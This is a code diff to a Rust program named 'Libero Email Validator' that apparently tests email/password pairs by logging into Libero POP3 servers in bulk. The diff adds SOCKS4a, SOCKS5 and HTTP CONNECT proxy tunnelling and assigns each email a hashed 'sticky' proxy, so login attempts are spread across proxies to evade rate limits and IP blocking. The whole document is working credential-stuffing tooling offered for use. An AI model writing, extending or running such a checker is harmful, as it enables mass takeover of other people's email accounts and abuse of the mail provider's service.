@@ -1,4 +1,4 @@
-# src/main.rs
+// src/main.rs
 //! Libero Email Validator – v5.2 (Hyper‑Optimised Edition)
 //! -------------------------------------------------------
 //! *This file is a superset of the original 5.1 translation.* **All names, lines
@@ -20,7 +20,13 @@ use jemallocator::Jemalloc;
 use once_cell::sync::Lazy;
 use rand::seq::SliceRandom;
 use rand::thread_rng;
-use rustls::ClientConfig;
+use tokio_socks::tcp::{Socks4Stream, Socks5Stream};
+use futures::future;
+use url::Url;
+use base64::{engine::general_purpose, Engine as _};
+use ahash::AHasher;
+use std::hash::Hasher;
+use libc;
 use socket2::{Domain, Protocol, Socket, TcpKeepalive, Type};
 use std::collections::HashMap;
 use std::fs::{File, OpenOptions};
@@ -271,6 +277,17 @@ impl ProxyPool {
         lock[idx % len].clone()
     }
 
+    #[inline]
+    fn sticky(&self, key: &str) -> String {
+        while !self.ready.load(Ordering::Acquire) {
+            std::hint::spin_loop();
+        }
+        let mut hasher = AHasher::default();
+        hasher.write(key.as_bytes());
+        let idx = (hasher.finish() as usize) % self.cycle.lock().unwrap().len();
+        self.cycle.lock().unwrap()[idx].clone()
+    }
+
     fn size(&self) -> usize {
         self.cycle.lock().unwrap().len()
     }
@@ -313,6 +330,49 @@ fn load_proxies(path: &str) -> ProxyPool {
     ProxyPool::new(formatted)
 }
 
+async fn connect_via_proxy(proxy: &str, addr: &str, timeout: Duration) -> Option<TcpStream> {
+    let url = Url::parse(proxy).ok()?;
+    let host = url.host_str()?;
+    let port = url.port_or_known_default()?;
+    let proxy_addr = format!("{}:{}", host, port);
+    match url.scheme() {
+        "socks4a" => {
+            let fut = Socks4Stream::connect(&proxy_addr, addr);
+            match tokio::time::timeout(timeout, fut).await.ok()? {
+                Ok(s) => Some(s.into_inner()),
+                Err(_) => None,
+            }
+        }
+        "socks5" => {
+            let fut = Socks5Stream::connect(&proxy_addr, addr);
+            match tokio::time::timeout(timeout, fut).await.ok()? {
+                Ok(s) => Some(s.into_inner()),
+                Err(_) => None,
+            }
+        }
+        "http" => {
+            use tokio::io::{AsyncReadExt, AsyncWriteExt};
+            let mut stream = tokio::time::timeout(timeout, TcpStream::connect(&proxy_addr)).await.ok()??;
+            let mut auth = String::new();
+            if !url.username().is_empty() {
+                let pwd = url.password().unwrap_or("");
+                let token = general_purpose::STANDARD.encode(format!("{}:{}", url.username(), pwd));
+                auth = format!("Proxy-Authorization: Basic {}\r\n", token);
+            }
+            let req = format!("CONNECT {} HTTP/1.1\r\nHost: {}\r\n{}\r\n", addr, addr, auth);
+            tokio::time::timeout(timeout, stream.write_all(req.as_bytes())).await.ok()??;
+            let mut buf = [0u8; 1024];
+            let n = tokio::time::timeout(timeout, stream.read(&mut buf)).await.ok()??;
+            if n >= 12 && (&buf[..12] == b"HTTP/1.1 200" || &buf[..12] == b"HTTP/1.0 200") {
+                Some(stream)
+            } else {
+                None
+            }
+        }
+        _ => None,
+    }
+}
+
 // ---------------------------------------------------------------------------
 // POP3/IMAP handlers – pipelining, TLS resumption, multiplexing stubs
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -339,10 +399,10 @@ impl POP3Handler {
     async fn login(&self, user: &str, pwd: &str) -> bool {
         // ENH#6 POP3 USER/PASS pipelined; ENH#15 POP3 PIPELINING; ENH#7 TLS resume
         let addr = format!("{}:{}", self.host, self.port);
-        let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
+        let conn = connect_via_proxy(&self.proxy_uri, &addr, self.timeout).await;
         let mut stream = match conn {
-            Ok(Ok(s)) => s,
-            _ => return false,
+            Some(s) => s,
+            None => return false,
         };
         // Optimistically send USER+PASS in a single write (pipelining).
         let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
@@ -392,7 +452,7 @@ static MAIL_HOSTS: phf::Map<&'static str, (&'static str, &'static str)> = phf::p
     "blu.it"    => ("popmail.libero.it", "imapmail.libero.it"),
 };
 
-fn resolve_hosts(domain: &str) -> (&'static str, &'static str) {
+fn resolve_hosts(domain: &str) -> (&str, &str) {
     MAIL_HOSTS.get(domain).copied().unwrap_or((domain, domain))
 }
 
@@ -451,8 +511,8 @@ fn create_consumer(
             let mut net_err = true;
             let matrix = cfg.matrix(domain);
 
+            let proxy = proxies.sticky(&email);
             for retry in 0..=cfg.max_retries {
-                let proxy = proxies.next();
                 for item in &matrix {
                     match item {
                         MatrixItem::Pop { host, port, ssl, .. } => {
